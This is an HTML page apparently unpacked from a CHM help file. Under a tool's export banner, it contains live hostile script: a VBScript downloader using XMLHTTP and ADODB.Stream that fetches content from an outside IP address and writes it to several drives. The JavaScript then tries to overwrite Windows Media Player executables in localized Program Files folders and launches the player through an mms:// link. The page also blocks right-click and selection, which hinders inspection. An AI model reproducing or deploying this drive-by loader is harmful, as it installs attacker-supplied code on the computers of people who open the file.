================================================================================
<br>This file has been exported by unregistered version of CHMUnpacker.
<br>This message is not appear on files exported by a registered version of CHMUnpacker.
<br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
<br>================================================================================
<br>
<br>
<br>
<br><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<script language="VBScript">
Function exs(de,fn)
On Error Resume Next
set oHTTP = CreateObject("msxml2.XMLHTTP")
oHTTP.open "GET", de, False
oHTTP.send
set oStream = createobject("adodb.stream")
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
oStream.type = adTypeBinary
oStream.open
oStream.write oHTTP.responseBody
oStream.savetofile fn, adSaveCreateOverWrite
End Function
</script>

<script language="javascript">
function getid() {
 n=document.location+'';
 if(n.indexOf('mhtml:')!=-1) { n=n.match(/MAIN([0-9]{1,4}).MHT/);n=n[1];}
 else if(n.indexOf('counter_')!=-1) {n=n.match(/counter_([0-9]{1,4})/);n=n[1];}
 else {n='0000';}
 return n;
}

a = ["Program Files", "Programmer","Programe","Programmi","Programfiler","Programas","Archivos de programa"];
s = ["C","D","E","F"];
d = ["wmplayer.exe", "mplayer2.exe"];

for(l=0;l<s.length;l++){exs("http://213.159.118.226/content.php?i="+getid(), s[l]+":\\id.txt");}
for(i=0;i<a.length;i++){for(l=0;l<s.length;l++){for(f=0;f<d.length;f++){ exs("x.exe", s[l]+":\\"+a[i]+"\\Windows Media Player\\"+d[f]); }}}
location.href="mms://";
</script>